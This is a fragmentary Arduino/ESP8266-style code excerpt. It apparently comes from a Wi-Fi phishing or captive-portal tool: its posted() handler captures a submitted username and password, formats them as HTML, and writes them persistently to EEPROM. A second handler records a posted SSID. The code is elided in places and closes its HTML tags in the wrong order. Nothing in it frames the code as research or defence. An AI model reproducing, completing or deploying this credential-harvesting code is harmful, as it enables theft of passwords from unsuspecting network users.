...
String posted() {
  String user = input("m");
  String pass = input("p");
  String fullPass = "<li><b>" + user + ":" + pass + "</li></b>"; // Adding password in an ordered list.
  allPass += fullPass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= fullPass.length(); ++i) {
    EEPROM.write(passEnd + i, fullPass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += fullPass.length(); // Updating end position of passwords in EEPROM.
...
String postedSSID() {
  String postedSSID = input("s"); // Assuming `input` is a valid function in your environment
  String newSSID = "<li><b>" + postedSSID + "</b></li>";
  ...
  return newSSID;  // Added return statement
}
